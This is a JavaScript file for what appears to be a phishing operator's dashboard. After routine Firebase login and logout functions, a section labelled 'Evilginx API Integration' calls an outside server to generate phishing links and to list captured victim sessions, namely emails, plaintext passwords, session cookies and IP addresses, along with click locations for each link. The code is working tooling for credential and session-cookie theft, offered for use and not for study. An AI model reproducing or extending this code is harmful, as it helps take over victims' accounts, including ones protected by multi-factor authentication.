console.log("✅ script.js loaded successfully");

// Make sure Firebase is defined
document.addEventListener("DOMContentLoaded", function() {
  if (typeof firebase === "undefined") {
    console.error("❌ Firebase is NOT defined. Check firebase-config.js.");
    return;
  }
  checkAuthStatus();
});

// Check Authentication and Redirect Accordingly
function checkAuthStatus() {
  firebase.auth().onAuthStateChanged(function(user) {
    if (user) {
      console.log("✅ User logged in:", user.email);
      // If the user is on the login page but already logged in, redirect to dashboard.
      if (window.location.pathname.includes("index.html") || window.location.pathname === "/") {
        window.location.href = "dashboard.html";
      }
    } else {
      console.log("❌ User not logged in.");
      // If the user is on the dashboard and not logged in, redirect to login.
      if (window.location.pathname.includes("dashboard.html")) {
        window.location.href = "index.html";
      }
    }
  });
}

// Login Function
function login() {
  const email = document.getElementById("email").value;
  const password = document.getElementById("password").value;

  firebase.auth().signInWithEmailAndPassword(email, password)
    .then(function(userCredential) {
      console.log("✅ Login successful:", userCredential.user.email);
      window.location.href = "dashboard.html";
    })
    .catch(function(error) {
      console.error("❌ Login failed:", error.message);
      document.getElementById("loginError").innerText = error.message;
    });
}

// Logout Function
function logout() {
  firebase.auth().signOut()
    .then(function() {
      console.log("✅ User logged out.");
      window.location.href = "index.html";
    })
    .catch(function(error) {
      console.error("❌ Logout failed:", error.message);
    });
}

// -------------------- Evilginx API Integration --------------------

// Set your Evilginx server (use your domain if available)
const EVILGINX_SERVER = "http://tecan.com.co:5000";  // Replace with your domain or public IP plus port 5000

// Generate Evilginx Phishing Link
function generateLink() {
  fetch(`${EVILGINX_SERVER}/generate_link`)
    .then(function(response) { return response.json(); })
    .then(function(data) {
      console.log("✅ Link generated:", data.link);
      alert("Phishing Link: " + data.link);
    })
    .catch(function(error) {
      console.error("❌ Error generating link:", error);
      alert("Error generating link.");
    });
}

// Fetch Captured Sessions (returns an array of session objects)
function viewCapturedSessions() {
  fetch(`${EVILGINX_SERVER}/captured_sessions`)
    .then(function(response) { return response.json(); })
    .then(function(data) {
      let tableBody = document.getElementById("capturedSessions");
      tableBody.innerHTML = ""; // Clear existing rows
      data.forEach(function(session) {
        let row = `<tr>
          <td>${session.email}</td>
          <td>${session.password}</td>
          <td>${session.cookies}</td>
          <td>${session.ip}</td>
        </tr>`;
        tableBody.innerHTML += row;
      });
      console.log("✅ Captured sessions loaded successfully.");
    })
    .catch(function(error) {
      console.error("❌ Error fetching captured sessions:", error);
      alert("Error fetching captured sessions.");
    });
}

// Fetch Generated Links History (returns an array of link objects)
function viewGeneratedLinks() {
  fetch(`${EVILGINX_SERVER}/generated_links`)
    .then(function(response) { return response.json(); })
    .then(function(data) {
      let tableBody = document.getElementById("generatedLinks");
      tableBody.innerHTML = ""; // Clear existing rows
      data.forEach(function(link) {
        let row = `<tr>
          <td>${link.url}</td>
          <td>${link.clicked_location}</td>
          <td>${link.ip}</td>
        </tr>`;
        tableBody.innerHTML += row;
      });
      console.log("✅ Generated links history loaded successfully.");
    })
    .catch(function(error) {
      console.error("❌ Error fetching generated links:", error);
      alert("Error fetching generated links.");
    });
}
